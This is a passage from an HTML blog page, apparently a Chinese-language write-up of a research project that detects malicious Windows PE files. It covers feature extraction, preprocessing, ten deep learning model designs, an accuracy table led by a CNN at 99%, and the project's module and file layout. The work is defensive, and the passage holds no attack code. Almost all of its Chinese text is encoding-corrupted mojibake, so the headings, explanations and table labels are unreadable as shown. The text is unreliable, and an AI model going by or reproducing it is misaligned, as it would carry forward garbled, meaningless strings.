å¯é€‰å¤´ç‰¹å¾ï¼ˆ28ä¸ªï¼‰</h4><ul><li><code>size_of_code</code>ï¼šä»£ç æ®µå¤§å°</li><li><code>size_of_image</code>ï¼šæ˜ åƒå¤§å°</li><li><code>address_of_entry_point</code>ï¼šå…¥å£ç‚¹åœ°å€</li><li><code>subsystem</code>ï¼šå­ç³»ç»Ÿç±»å‹</li><li>ç­‰</li></ul><h4 id="4-èŠ‚åŒºç»Ÿè®¡ç‰¹å¾ï¼ˆ6ä¸ªï¼‰"><a href="#4-èŠ‚åŒºç»Ÿè®¡ç‰¹å¾ï¼ˆ6ä¸ªï¼‰" class="headerlink" title="4. èŠ‚åŒºç»Ÿè®¡ç‰¹å¾ï¼ˆ6ä¸ªï¼‰"></a>4. èŠ‚åŒºç»Ÿè®¡ç‰¹å¾ï¼ˆ6ä¸ªï¼‰</h4><ul><li><code>avg_section_entropy</code>ï¼šå¹³å‡èŠ‚åŒºç†µå€¼</li><li><code>max_section_entropy</code>ï¼šæœ€å¤§èŠ‚åŒºç†µå€¼</li><li><code>total_virtual_size</code>ï¼šæ€»è™šæ‹Ÿå¤§å°</li><li><code>virtual_raw_ratio</code>ï¼šè™šæ‹Ÿ&#x2F;å®é™…å¤§å°æ¯”ç‡</li><li>ç­‰</li></ul><h3 id="æ•°æ®é¢„å¤„ç†ç­–ç•¥"><a href="#æ•°æ®é¢„å¤„ç†ç­–ç•¥" class="headerlink" title="æ•°æ®é¢„å¤„ç†ç­–ç•¥"></a>æ•°æ®é¢„å¤„ç†ç­–ç•¥</h3><ul><li><strong>ç¼©æ”¾æ–¹æ³•</strong>ï¼šæ ‡å‡†åŒ–ã€æœ€å°-æœ€å¤§ç¼©æ”¾ã€æ— ç¼©æ”¾</li><li><strong>ç‰¹å¾é€‰æ‹©</strong>ï¼šPCAé™ç»´ã€LDAé™ç»´ã€æ— é™ç»´</li><li><strong>ç»„åˆç­–ç•¥</strong>ï¼š3Ã—3&#x3D;9ç§é¢„å¤„ç†ç»„åˆ</li></ul><h2 id="ğŸ¤–-æ·±åº¦å­¦ä¹ æ¨¡å‹æ¶æ„"><a href="#ğŸ¤–-æ·±åº¦å­¦ä¹ æ¨¡å‹æ¶æ„" class="headerlink" title="ğŸ¤– æ·±åº¦å­¦ä¹ æ¨¡å‹æ¶æ„"></a>ğŸ¤– æ·±åº¦å­¦ä¹ æ¨¡å‹æ¶æ„</h2><p>é¡¹ç›®å®ç°äº†10ç§ä¸åŒçš„æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼š</p><h3 id="1-å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰"><a href="#1-å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰" class="headerlink" title="1. å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰"></a>1. å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Conv1D(<span class="number">64</span>, <span class="number">3</span>) + BatchNorm + MaxPooling</span><br><span class="line">- Conv1D(<span class="number">32</span>, <span class="number">3</span>) + BatchNorm + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="2-é•¿çŸ­æœŸè®°å¿†ç½‘ç»œï¼ˆLSTMï¼‰"><a href="#2-é•¿çŸ­æœŸè®°å¿†ç½‘ç»œï¼ˆLSTMï¼‰" class="headerlink" title="2. é•¿çŸ­æœŸè®°å¿†ç½‘ç»œï¼ˆLSTMï¼‰"></a>2. é•¿çŸ­æœŸè®°å¿†ç½‘ç»œï¼ˆLSTMï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- LSTM(<span class="number">64</span>, return_sequences=<span class="literal">True</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- LSTM(<span class="number">32</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="3-å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰"><a href="#3-å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰" class="headerlink" title="3. å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰"></a>3. å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- SimpleRNN(<span class="number">64</span>, return_sequences=<span class="literal">True</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- SimpleRNN(<span class="number">32</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="4-å¤šå±‚æ„ŸçŸ¥å™¨ï¼ˆMLPï¼‰"><a href="#4-å¤šå±‚æ„ŸçŸ¥å™¨ï¼ˆMLPï¼‰" class="headerlink" title="4. å¤šå±‚æ„ŸçŸ¥å™¨ï¼ˆMLPï¼‰"></a>4. å¤šå±‚æ„ŸçŸ¥å™¨ï¼ˆMLPï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Dense(<span class="number">256</span>) + BatchNorm + Dropout(<span class="number">0.4</span>)</span><br><span class="line">- Dense(<span class="number">128</span>) + BatchNorm + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">64</span>) + Dropout(<span class="number">0.2</span>) + Dense(<span class="number">32</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="5-è‡ªç»„ç»‡æ˜ å°„ç½‘ç»œï¼ˆSOMï¼‰"><a href="#5-è‡ªç»„ç»‡æ˜ å°„ç½‘ç»œï¼ˆSOMï¼‰" class="headerlink" title="5. è‡ªç»„ç»‡æ˜ å°„ç½‘ç»œï¼ˆSOMï¼‰"></a>5. è‡ªç»„ç»‡æ˜ å°„ç½‘ç»œï¼ˆSOMï¼‰</h3><ul><li>è‡ªé€‚åº”ç½‘æ ¼å¤§å°è®¾è®¡</li><li>12Ã—12æ˜ å°„å±‚ç”¨äºç‰¹å¾å¯è§†åŒ–</li></ul><h3 id="6-æ·±åº¦ä¿¡å¿µç½‘ç»œï¼ˆDBNï¼‰"><a href="#6-æ·±åº¦ä¿¡å¿µç½‘ç»œï¼ˆDBNï¼‰" class="headerlink" title="6. æ·±åº¦ä¿¡å¿µç½‘ç»œï¼ˆDBNï¼‰"></a>6. æ·±åº¦ä¿¡å¿µç½‘ç»œï¼ˆDBNï¼‰</h3><ul><li>å¤šå±‚sigmoidæ¿€æ´»</li><li>é€å±‚é¢„è®­ç»ƒæ¶æ„</li></ul><h3 id="7-å—é™ç»å°”å…¹æ›¼æœºï¼ˆRBMï¼‰"><a href="#7-å—é™ç»å°”å…¹æ›¼æœºï¼ˆRBMï¼‰" class="headerlink" title="7. å—é™ç»å°”å…¹æ›¼æœºï¼ˆRBMï¼‰"></a>7. å—é™ç»å°”å…¹æ›¼æœºï¼ˆRBMï¼‰</h3><ul><li>200â†’100â†’50çš„å±‚æ¬¡ç»“æ„</li><li>sigmoidæ¿€æ´»å‡½æ•°</li></ul><h3 id="8-è‡ªåŠ¨ç¼–ç å™¨ï¼ˆAutoEncoderï¼‰"><a href="#8-è‡ªåŠ¨ç¼–ç å™¨ï¼ˆAutoEncoderï¼‰" class="headerlink" title="8. è‡ªåŠ¨ç¼–ç å™¨ï¼ˆAutoEncoderï¼‰"></a>8. è‡ªåŠ¨ç¼–ç å™¨ï¼ˆAutoEncoderï¼‰</h3><ul><li>ç¼–ç å™¨ï¼š128â†’64â†’32</li><li>åˆ†ç±»å™¨ï¼š16â†’1</li></ul><h3 id="9-GANåˆ¤åˆ«å™¨"><a href="#9-GANåˆ¤åˆ«å™¨" class="headerlink" title="9. GANåˆ¤åˆ«å™¨"></a>9. GANåˆ¤åˆ«å™¨</h3><ul><li>256â†’128â†’64çš„åˆ¤åˆ«ç½‘ç»œ</li><li>é€‚ç”¨äºå¯¹æŠ—æ€§è®­ç»ƒ</li></ul><h3 id="10-å¾„å‘åŸºå‡½æ•°ç½‘ç»œï¼ˆRBFNï¼‰"><a href="#10-å¾„å‘åŸºå‡½æ•°ç½‘ç»œï¼ˆRBFNï¼‰" class="headerlink" title="10. å¾„å‘åŸºå‡½æ•°ç½‘ç»œï¼ˆRBFNï¼‰"></a>10. å¾„å‘åŸºå‡½æ•°ç½‘ç»œï¼ˆRBFNï¼‰</h3><ul><li>100ä¸ªå¾„å‘åŸºå•å…ƒ</li><li>é«˜æ–¯æ ¸å‡½æ•°</li></ul><h2 id="ğŸ“ˆ-å®éªŒè®¾è®¡ä¸ç»“æœ"><a href="#ğŸ“ˆ-å®éªŒè®¾è®¡ä¸ç»“æœ" class="headerlink" title="ğŸ“ˆ å®éªŒè®¾è®¡ä¸ç»“æœ"></a>ğŸ“ˆ å®éªŒè®¾è®¡ä¸ç»“æœ</h2><h3 id="å®éªŒé…ç½®"><a href="#å®éªŒé…ç½®" class="headerlink" title="å®éªŒé…ç½®"></a>å®éªŒé…ç½®</h3><ul><li><strong>è®­ç»ƒé›†&#x2F;æµ‹è¯•é›†</strong>ï¼š80%&#x2F;20%åˆ†å‰²</li><li><strong>äº¤å‰éªŒè¯</strong>ï¼šåˆ†å±‚KæŠ˜éªŒè¯</li><li><strong>ä¼˜åŒ–å™¨</strong>ï¼šAdamä¼˜åŒ–å™¨</li><li><strong>å­¦ä¹ ç‡</strong>ï¼š0.001ï¼ˆéƒ¨åˆ†æ¨¡å‹0.0002ï¼‰</li><li><strong>æ‰¹æ¬¡å¤§å°</strong>ï¼š32</li><li><strong>æ—©åœæœºåˆ¶</strong>ï¼špatience&#x3D;10</li><li><strong>å­¦ä¹ ç‡è°ƒåº¦</strong>ï¼šReduceLROnPlateau</li></ul><h3 id="æ€§èƒ½æŒ‡æ ‡"><a href="#æ€§èƒ½æŒ‡æ ‡" class="headerlink" title="æ€§èƒ½æŒ‡æ ‡"></a>æ€§èƒ½æŒ‡æ ‡</h3><ul><li><strong>å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰</strong></li><li><strong>ç²¾ç¡®ç‡ï¼ˆPrecisionï¼‰</strong></li><li><strong>å¬å›ç‡ï¼ˆRecallï¼‰</strong></li><li><strong>F1åˆ†æ•°</strong></li><li><strong>AUC-ROC</strong></li></ul><h3 id="å®éªŒç»“æœ"><a href="#å®éªŒç»“æœ" class="headerlink" title="å®éªŒç»“æœ"></a>å®éªŒç»“æœ</h3><p>æ ¹æ®å®éªŒç»“æœï¼Œå„æ¨¡å‹æ€§èƒ½æ’åå¦‚ä¸‹ï¼š</p><table><thead><tr><th>æ’å</th><th>æ¨¡å‹</th><th>å‡†ç¡®ç‡</th><th>ç²¾ç¡®ç‡</th><th>å¬å›ç‡</th><th>F1åˆ†æ•°</th><th>AUC</th></tr></thead><tbody><tr><td>1</td><td>CNN</td><td>99.0%</td><td>99.0%</td><td>99.0%</td><td>99.0%</td><td>0.999</td></tr><tr><td>2</td><td>SOM</td><td>98.75%</td><td>98.76%</td><td>98.75%</td><td>98.75%</td><td>0.999</td></tr><tr><td>3</td><td>MLP</td><td>98.5%</td><td>98.5%</td><td>98.5%</td><td>98.5%</td><td>0.998</td></tr><tr><td>4</td><td>RBM</td><td>98.25%</td><td>98.26%</td><td>98.25%</td><td>98.25%</td><td>0.999</td></tr><tr><td>5</td><td>DBN</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>6</td><td>GANåˆ¤åˆ«å™¨</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>7</td><td>RNN</td><td>98.0%</td><td>98.02%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>8</td><td>AutoEncoder</td><td>97.75%</td><td>97.75%</td><td>97.75%</td><td>97.75%</td><td>0.998</td></tr><tr><td>9</td><td>LSTM</td><td>96.75%</td><td>96.78%</td><td>96.75%</td><td>96.75%</td><td>0.995</td></tr><tr><td>10</td><td>RBFN</td><td>50.0%</td><td>25.0%</td><td>50.0%</td><td>33.33%</td><td>0.5</td></tr></tbody></table><h2 id="ğŸ”-å…³é”®å‘ç°"><a href="#ğŸ”-å…³é”®å‘ç°" class="headerlink" title="ğŸ” å…³é”®å‘ç°"></a>ğŸ” å…³é”®å‘ç°</h2><h3 id="1-æ¨¡å‹æ€§èƒ½åˆ†æ"><a href="#1-æ¨¡å‹æ€§èƒ½åˆ†æ" class="headerlink" title="1. æ¨¡å‹æ€§èƒ½åˆ†æ"></a>1. æ¨¡å‹æ€§èƒ½åˆ†æ</h3><ul><li><strong>CNNè¡¨ç°æœ€ä¼˜</strong>ï¼šåœ¨æ‰€æœ‰æŒ‡æ ‡ä¸Šéƒ½è¾¾åˆ°äº†99%çš„æ€§èƒ½</li><li><strong>ä¼ ç»Ÿç¥ç»ç½‘ç»œæ•ˆæœè‰¯å¥½</strong>ï¼šSOMã€MLPç­‰ç®€å•æ¨¡å‹ä¹Ÿè¾¾åˆ°äº†98%+çš„å‡†ç¡®ç‡</li><li><strong>åºåˆ—æ¨¡å‹è¡¨ç°ä¸­ç­‰</strong>ï¼šLSTMã€RNNåœ¨é™æ€ç‰¹å¾ä¸Šè¡¨ç°ä¸å¦‚CNN</li><li><strong>RBFNæ€§èƒ½è¾ƒå·®</strong>ï¼šå¯èƒ½ç”±äºå¾„å‘åŸºå‡½æ•°ä¸é€‚åˆæ­¤ç±»ç‰¹å¾</li></ul><h3 id="2-ç‰¹å¾å·¥ç¨‹å½±å“"><a href="#2-ç‰¹å¾å·¥ç¨‹å½±å“" class="headerlink" title="2. ç‰¹å¾å·¥ç¨‹å½±å“"></a>2. ç‰¹å¾å·¥ç¨‹å½±å“</h3><ul><li><strong>æ ‡å‡†åŒ–æ•ˆæœæ˜¾è‘—</strong>ï¼šå¤§å¤šæ•°æ¨¡å‹åœ¨æ ‡å‡†åŒ–åæ€§èƒ½æå‡</li><li><strong>PCAé™ç»´æœ‰æ•ˆ</strong>ï¼šåœ¨ä¿æŒæ€§èƒ½çš„åŒæ—¶å‡å°‘äº†è®¡ç®—å¤æ‚åº¦</li><li><strong>LDAæ•ˆæœæœ‰é™</strong>ï¼šç”±äºæ˜¯äºŒåˆ†ç±»é—®é¢˜ï¼ŒLDAé™ç»´æ•ˆæœä¸æ˜æ˜¾</li></ul><h3 id="3-æŠ€æœ¯åˆ›æ–°ç‚¹"><a href="#3-æŠ€æœ¯åˆ›æ–°ç‚¹" class="headerlink" title="3. æŠ€æœ¯åˆ›æ–°ç‚¹"></a>3. æŠ€æœ¯åˆ›æ–°ç‚¹</h3><ul><li><strong>å…¨é¢çš„æ¨¡å‹æ¯”è¾ƒ</strong>ï¼šé¦–æ¬¡åœ¨PEæ¶æ„ä»£ç æ£€æµ‹ä¸­æ¯”è¾ƒ10ç§æ·±åº¦å­¦ä¹ æ¨¡å‹</li><li><strong>è‡ªåŠ¨åŒ–ç‰¹å¾æå–</strong>ï¼šå®Œæ•´çš„PEæ–‡ä»¶ç‰¹å¾æå–pipeline</li><li><strong>å¤šç»´åº¦è¯„ä¼°</strong>ï¼šä»å‡†ç¡®ç‡ã€æ•ˆç‡ã€é²æ£’æ€§å¤šè§’åº¦è¯„ä¼°æ¨¡å‹</li></ul><h2 id="ğŸ› -æŠ€æœ¯æ¶æ„"><a href="#ğŸ› -æŠ€æœ¯æ¶æ„" class="headerlink" title="ğŸ›  æŠ€æœ¯æ¶æ„"></a>ğŸ›  æŠ€æœ¯æ¶æ„</h2><h3 id="ç³»ç»Ÿç»„ä»¶"><a href="#ç³»ç»Ÿç»„ä»¶" class="headerlink" title="ç³»ç»Ÿç»„ä»¶"></a>ç³»ç»Ÿç»„ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">æ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ</span><br><span class="line">â”œâ”€â”€ æ•°æ®é‡‡é›†æ¨¡å—</span><br><span class="line">â”‚   â”œâ”€â”€ æ ·æœ¬ä¸‹è½½å™¨ (æŒ‡å®šæ—¥æœŸä¸‹è½½æ–‡ä»¶å¹¶è§£å‹.py)</span><br><span class="line">â”‚   â””â”€â”€ PEæ–‡ä»¶éªŒè¯å™¨ (copy.py)</span><br><span class="line">â”œâ”€â”€ ç‰¹å¾æå–æ¨¡å—</span><br><span class="line">â”‚   â”œâ”€â”€ PEè§£æå™¨ (PEFeatureExtractor)</span><br><span class="line">â”‚   â””â”€â”€ ç‰¹å¾å·¥ç¨‹ (preprocess_data)</span><br><span class="line">â”œâ”€â”€ æ¨¡å‹è®­ç»ƒæ¨¡å—</span><br><span class="line">â”‚   â”œâ”€â”€ 10ç§æ·±åº¦å­¦ä¹ æ¨¡å‹</span><br><span class="line">â”‚   â””â”€â”€ è¶…å‚æ•°ä¼˜åŒ–</span><br><span class="line">â”œâ”€â”€ è¯„ä¼°åˆ†ææ¨¡å—</span><br><span class="line">â”‚   â”œâ”€â”€ æ€§èƒ½æŒ‡æ ‡è®¡ç®—</span><br><span class="line">â”‚   â”œâ”€â”€ å¯è§†åŒ–åˆ†æ</span><br><span class="line">â”‚   â””â”€â”€ ç»“æœå¯¼å‡º</span><br><span class="line">â””â”€â”€ å·¥å…·æ¨¡å—</span><br><span class="line">    â”œâ”€â”€ æ–‡ä»¶ç»Ÿè®¡ (ç»Ÿè®¡ç›®å½•ä¸‹peæ–‡ä»¶æ•°é‡.py)</span><br><span class="line">    â””â”€â”€ æ•°æ®ç®¡ç†</span><br></pre></td></tr></table></figure><h3 id="ä¾èµ–ç¯å¢ƒ"><a href="#ä¾èµ–ç¯å¢ƒ" class="headerlink" title="ä¾èµ–ç¯å¢ƒ"></a>ä¾èµ–ç¯å¢ƒ</h3><ul><li><strong>Python 3.8+</strong></li><li><strong>TensorFlow 2.x</strong></li><li><strong>scikit-learn</strong></li><li><strong>pandas, numpy</strong></li><li><strong>matplotlib, seaborn</strong></li><li><strong>pefile</strong>ï¼ˆPEæ–‡ä»¶è§£æï¼‰</li><li><strong>pyzipper</strong>ï¼ˆæ ·æœ¬è§£å‹ï¼‰</li></ul><h2 id="ğŸ“‹-é¡¹ç›®æ–‡ä»¶ç»“æ„"><a href="#ğŸ“‹-é¡¹ç›®æ–‡ä»¶ç»“æ„" class="headerlink" title="ğŸ“‹ é¡¹ç›®æ–‡ä»¶ç»“æ„"></a>ğŸ“‹ é¡¹ç›®æ–‡ä»¶ç»“æ„</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pythonProject/</span><br><span class="line">â”œâ”€â”€ main.py                          # ä¸»ç¨‹åºï¼ˆå®Œæ•´çš„æ£€æµ‹ç³»ç»Ÿï¼‰</span><br><span class="line">â”œâ”€â”€ natureè®­ç»ƒPEæ£€æµ‹ä»£ç .py            # ä¼˜åŒ–ç‰ˆæ£€æµ‹ä»£ç </span><br><span class="line">â”œâ”€â”€ æŒ‡å®šæ—¥æœŸä¸‹è½½æ–‡ä»¶å¹¶è§£å‹.py          # æ ·æœ¬ä¸‹è½½å·¥å…·</span><br><span class="line">â”œâ”€â”€ copy.py                          # PEæ–‡ä»¶æ”¶é›†å·¥å…·</span><br><span class="line">â”œâ”€â”€ ç»Ÿè®¡ç›®å½•ä¸‹peæ–‡ä»¶æ•°é‡.py           # ç»Ÿè®¡å·¥å…·</span><br><span class="line">â”œâ”€â”€ pe_malware_results.csv           # å®éªŒç»“æœ</span><br><span class="line">â”œâ”€â”€ downloads/                       # ä¸‹è½½çš„æ ·æœ¬å‹ç¼©åŒ…</span><br><span class="line">â”œâ”€â”€ extracted_samples/               # è§£å‹çš„æ¶æ„æ ·æœ¬</span><br><span class="line">â”œâ”€â”€ valid_pe_files_bin/             # æœ‰æ•ˆPEæ–‡ä»¶ï¼ˆ.binæ ¼å¼ï¼‰</span><br><span class="line">â”œâ”€â”€ ç»“æœå›¾è¡¨/</span><br><span class="line">â”‚   â”œâ”€â”€ pe_malware_detection_results.png</span><br><span class="line">â”‚   â”œâ”€â”€ best_models_roc_curves.png</span><br><span class="line">â”‚   â””â”€â”€ feature_importance_analysis.png</span><br><span class="line">â””â”€â”€ venv/                           # Pythonè™šæ‹Ÿç¯å¢ƒ</span><br></pre></td></tr></table></figure><h2 id="ğŸ“-å­¦æœ¯è´¡çŒ®"><a href="#ğŸ“-å­¦æœ¯è´¡çŒ®" class="headerlink" title="ğŸ“ å­¦æœ¯è´¡çŒ®"></a>ğŸ“ å­¦æœ¯è´¡çŒ®</h2><h3 id="1-ç†è®ºè´¡çŒ®"><a href="#1-ç†è®ºè´¡çŒ®" class="headerlink" title="1. ç†è®ºè´¡çŒ®"></a>1. ç†è®ºè´¡çŒ®</h3><ul><li><strong>æ¨¡å‹é€‚ç”¨æ€§ç ”ç©¶</strong>ï¼šç³»ç»Ÿè¯„ä¼°äº†ä¸åŒæ·±åº¦å­¦ä¹ æ¶æ„åœ¨æ¶æ„ä»£ç æ£€æµ‹ä¸­çš„é€‚ç”¨æ€§</li><li><strong>ç‰¹å¾é‡è¦æ€§åˆ†æ</strong>ï¼šè¯†åˆ«äº†PEæ–‡ä»¶ä¸­å¯¹æ¶æ„æ€§æ£€æµ‹æœ€é‡è¦çš„ç‰¹å¾</li><li><strong>é¢„å¤„ç†ç­–ç•¥ä¼˜åŒ–</strong>ï¼šç¡®å®šäº†æœ€ä¼˜çš„æ•°æ®é¢„å¤„ç†ç»„åˆ</li></ul><h3 id="2-å®è·µè´¡çŒ®"><a href="#2-å®è·µè´¡çŒ®" class="headerlink" title="2. å®è·µè´¡çŒ®"></a>2. å®è·µè´¡çŒ®</h3><ul><li><strong>å¼€æºæ£€æµ‹ç³»ç»Ÿ</strong>ï¼šæä¾›äº†å®Œæ•´çš„ã€å¯å¤ç°çš„æ¶æ„ä»£ç æ£€æµ‹pipeline</li><li><strong>è‡ªåŠ¨åŒ–å·¥å…·é“¾</strong>ï¼šä»æ ·æœ¬æ”¶é›†åˆ°ç»“æœåˆ†æçš„å…¨è‡ªåŠ¨åŒ–æµç¨‹</li><li><strong>æ€§èƒ½åŸºå‡†</strong>ï¼šä¸ºåç»­ç ”ç©¶æä¾›äº†æ ‡å‡†çš„æ€§èƒ½å¯¹æ¯”åŸºå‡†</li></ul><h3 id="3-æ–¹æ³•åˆ›æ–°"><a href="#3-æ–¹æ³•åˆ›æ–°" class="headerlink" title="3. æ–¹æ³•åˆ›æ–°"></a>3. æ–¹æ³•åˆ›æ–°</h3><ul><li><strong>å¤šæ¨¡å‹é›†æˆæ€è·¯</strong>ï¼šä¸ºæ„å»ºæ›´å¼ºå¤§çš„é›†æˆæ£€æµ‹å™¨å¥ å®šåŸºç¡€</li><li><strong>ç‰¹å¾å·¥ç¨‹ä¼˜åŒ–</strong>ï¼šæå‡ºäº†PEæ–‡ä»¶ç‰¹å¾æå–çš„æœ€ä½³å®è·µ</li><li><strong>è¯„ä¼°æ¡†æ¶</strong>ï¼šå»ºç«‹äº†å…¨é¢çš„æ¨¡å‹è¯„ä¼°ä½“ç³»</li></ul><h2 id="ğŸ”®-æœªæ¥å·¥ä½œæ–¹å‘"><a href="#ğŸ”®-æœªæ¥å·¥ä½œæ–¹å‘" class="headerlink" title="ğŸ”® æœªæ¥å·¥ä½œæ–¹å‘"></a>ğŸ”® æœªæ¥å·¥ä½œæ–¹å‘</h2><h3 id="1-æ¨¡å‹ä¼˜åŒ–"><a href="#1-æ¨¡å‹ä¼˜åŒ–" class="headerlink" title="1. æ¨¡å‹ä¼˜åŒ–"></a>1. æ¨¡å‹ä¼˜åŒ–</h3><ul><li><strong>é›†æˆå­¦ä¹ </strong>ï¼šç»“åˆå¤šä¸ªé«˜æ€§èƒ½æ¨¡å‹æ„å»ºé›†æˆæ£€æµ‹å™¨</li><li><strong>æ³¨æ„åŠ›æœºåˆ¶</strong>ï¼šå¼•å…¥Transformeræ¶æ„æå‡ç‰¹å¾å­¦ä¹ èƒ½åŠ›</li><li><strong>å¯¹æŠ—è®­ç»ƒ</strong>ï¼šå¢å¼ºæ¨¡å‹å¯¹å¯¹æŠ—æ ·æœ¬çš„é²æ£’æ€§</li></ul><h3 id="2-ç‰¹å¾æ‰©å±•"><a href="#2-ç‰¹å¾æ‰©å±•" class="headerlink" title="2. ç‰¹å¾æ‰©å±•"></a>2. ç‰¹å¾æ‰©å±•</h3><ul><li><strong>åŠ¨æ€ç‰¹å¾</strong>ï¼šç»“åˆAPIè°ƒç”¨åºåˆ—ã€è¡Œä¸ºç‰¹å¾</li><li><strong>å›¾ç»“æ„ç‰¹å¾</strong>ï¼šåˆ©ç”¨å‡½æ•°è°ƒç”¨å›¾ã€æ§åˆ¶æµå›¾</li><li><strong>æ·±åº¦ç‰¹å¾</strong>ï¼šä½¿ç”¨é¢„è®­ç»ƒæ¨¡å‹æå–é«˜çº§è¯­ä¹‰ç‰¹å¾</li></ul><h3 id="3-å®é™…éƒ¨ç½²"><a href="#3-å®é™…éƒ¨ç½²" class="headerlink" title="3. å®é™…éƒ¨ç½²"></a>3. å®é™…éƒ¨ç½²</h3><ul><li><strong>å®æ—¶æ£€æµ‹</strong>ï¼šä¼˜åŒ–æ¨¡å‹æ¨ç†é€Ÿåº¦ï¼Œæ”¯æŒå®æ—¶æ£€æµ‹</li><li><strong>å¢é‡å­¦ä¹ </strong>ï¼šæ”¯æŒæ–°æ ·æœ¬çš„åœ¨çº¿å­¦ä¹ æ›´æ–°</li><li><strong>è¾¹ç¼˜è®¡ç®—</strong>ï¼šæ¨¡å‹å‹ç¼©ä¸è¾¹ç¼˜è®¾å¤‡éƒ¨ç½²</li></ul><h2 id="ğŸ“š-å‚è€ƒæ–‡çŒ®ä¸ç›¸å…³å·¥ä½œ"><a href="#ğŸ“š-å‚è€ƒæ–‡çŒ®ä¸ç›¸å…³å·¥ä½œ" class="headerlink" title="ğŸ“š å‚è€ƒæ–‡çŒ®ä¸ç›¸å…³å·¥ä½œ"></a>ğŸ“š å‚è€ƒæ–‡çŒ®ä¸ç›¸å…³å·¥ä½œ</h2><ol><li><strong>PEæ–‡ä»¶æ ¼å¼åˆ†æ</strong>ï¼šMicrosoft PE&#x2F;COFFè§„èŒƒ</li><li><strong>æ¶æ„ä»£ç æ£€æµ‹ç»¼è¿°</strong>ï¼šæ·±åº¦å­¦ä¹ åœ¨æ¶æ„è½¯ä»¶æ£€æµ‹ä¸­çš„åº”ç”¨</li><li><strong>ç‰¹å¾å·¥ç¨‹æ–¹æ³•</strong>ï¼šé™æ€åˆ†æä¸åŠ¨æ€åˆ†ææŠ€æœ¯å¯¹æ¯”</li><li><strong>æ·±åº¦å­¦ä¹ æ¶æ„</strong>ï¼šCNNã€RNNã€Transformeråœ¨åºåˆ—åˆ†æä¸­çš„åº”ç”¨</li></ol><h2 id="ğŸ†-é¡¹ç›®äº®ç‚¹"><a href="#ğŸ†-é¡¹ç›®äº®ç‚¹" class="headerlink" title="ğŸ† é¡¹ç›®äº®ç‚¹"></a>ğŸ† é¡¹ç›®äº®ç‚¹</h2><h3 id="æŠ€æœ¯äº®ç‚¹"><a href="#æŠ€æœ¯äº®ç‚¹" class="headerlink" title="æŠ€æœ¯äº®ç‚¹"></a>æŠ€æœ¯äº®ç‚¹</h3><ul><li>âœ… <strong>å…¨é¢çš„æ¨¡å‹æ¯”è¾ƒ</strong>ï¼š10ç§æ·±åº¦å­¦ä¹ æ¨¡å‹çš„ç³»ç»Ÿæ€§è¯„ä¼°</li><li>âœ… <strong>å®Œæ•´çš„å·¥ç¨‹å®ç°</strong>ï¼šä»æ•°æ®é‡‡é›†åˆ°ç»“æœåˆ†æçš„ç«¯åˆ°ç«¯ç³»ç»Ÿ</li><li>âœ… <strong>é«˜æ£€æµ‹ç²¾åº¦</strong>ï¼šæœ€ä½³æ¨¡å‹è¾¾åˆ°99%çš„æ£€æµ‹å‡†ç¡®ç‡</li><li>âœ… <strong>å¯æ‰©å±•æ¶æ„</strong>ï¼šæ¨¡å—åŒ–è®¾è®¡ï¼Œæ˜“äºæ‰©å±•æ–°æ¨¡å‹å’Œç‰¹å¾</li></ul><h3 id="å­¦æœ¯ä»·å€¼"><a href="#å­¦æœ¯ä»·å€¼" class="headerlink" 